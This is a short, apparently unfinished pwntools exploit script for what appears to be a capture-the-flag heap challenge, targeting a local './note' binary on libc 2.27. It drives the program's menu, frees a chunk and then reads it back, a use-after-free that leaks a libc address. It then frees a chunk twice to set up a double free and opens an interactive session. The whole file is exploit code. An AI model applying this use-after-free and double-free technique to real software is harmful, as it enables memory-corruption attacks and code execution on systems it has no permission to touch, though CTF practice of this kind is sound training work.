#forfify disable 

from pwn import* 
context.arch='amd64'
context.log_level = 'debug'
r = process('./note')
libc = ELF('./libc-2.27.so')

#creat use calloc 
def create(size):
	r.sendafter("Your choice: ",str(1))
	r.sendafter("Input size: ",str(size))

def edit(index,context):
	r.sendafter("Your choice: ",str(2))
	r.sendafter("Input idx: ",str(index))
	r.sendafter("Your context: ",context)
	
def show(index):	
	r.sendafter("Your choice: ",str(3))
	r.sendafter("Input idx: ",str(index))

def copy(index,indexx):
	r.sendafter("Your choice: ",str(4))
	r.sendafter("Source idx: ",str(index))
	r.sendafter("Destination idx: ",str(indexx))

def delete(index):
	r.sendafter("Your choice: ",str(5))
	r.sendafter("Input idx: ",str(index))

def exit():
	r.sendafter("Your choice: ",str(6))

#leak
create(0x100)
edit(0,'leak')
create(0x40)
edit(1,'b')
create(0x40)
edit(2,'b')

delete(0)
pause()
show(0)

leak = u64(r.recv(6)+ '\0\0') 
success("libc-> %s" % hex(leak))
pause()

#raw_input('wait')
delete(1)
pause()
delete(0)

r.interactive()

